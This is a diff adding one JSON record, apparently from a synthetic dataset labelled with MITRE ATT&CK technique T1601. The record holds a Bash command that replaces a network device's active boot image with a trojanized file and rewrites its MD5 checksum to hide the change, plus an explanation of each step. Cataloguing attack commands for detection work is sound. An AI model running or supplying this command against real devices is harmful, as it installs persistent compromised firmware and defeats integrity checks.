@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "cp -f /tmp/active.img.trojan /bootflash/active.img && sync && md5sum /bootflash/active.img > /etc/firmware/active.img.md5",
+  "explanation": "Replaces the active system image with a trojanized image and immediately updates the checksum file to conceal the change.",
+  "rationale_steps": [
+    "Overwrite the active system image with a modified file",
+    "Flush writes to storage to ensure persistence",
+    "Recalculate and overwrite the stored MD5 to hide tampering"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-3f5b9fd2-3d232f82",
+  "source_prompt_hash": "3f5b9fd2",
+  "timestamp_utc": "2025-09-30T04:34:26.844102Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
